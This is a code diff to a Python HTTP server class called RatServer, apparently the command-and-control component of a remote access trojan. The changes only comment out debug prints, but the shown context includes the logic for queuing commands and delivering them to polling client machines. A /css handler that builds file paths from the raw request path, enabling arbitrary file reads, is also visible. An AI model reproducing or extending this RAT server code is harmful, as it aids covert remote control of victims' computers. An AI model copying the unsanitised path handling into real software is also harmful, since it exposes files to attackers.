@@ -21,7 +21,7 @@ class RatServer(BaseHTTPRequestHandler):
             
             cssfile = self.path.replace("/css",str(Path(__file__).resolve().parent))
             
-            print("getting file "+cssfile)
+            #print("getting file "+cssfile)
             with open(cssfile) as f:
                 lines = "\n".join(f.readlines())
                 if lines!=None:
@@ -34,12 +34,12 @@ class RatServer(BaseHTTPRequestHandler):
         if self.path == "/client/command":
             
             self._updateClient()
-            print(RatServer.clientMap)
+            #print(RatServer.clientMap)
             clientAddress = self.client_address[0]
             commandList = []
             
             for command in RatServer.clientMap[clientAddress]['commands']:
-                print(str(command))
+                #print(str(command))
                 if command['pickedup']==False:
                     commandList.append(command)
                     command['pickedup']=True
@@ -110,7 +110,7 @@ class RatServer(BaseHTTPRequestHandler):
                     self.send_header("Content-type", "text")
                     self.end_headers()
                     self.wfile.write(bytes("OK", "utf-8"))
-                    print(RatServer.clientMap)
+                    #print(RatServer.clientMap)
                     return
             except Exception as e:
                 print("Error: /server/command "+post_body+" "+e.msg)
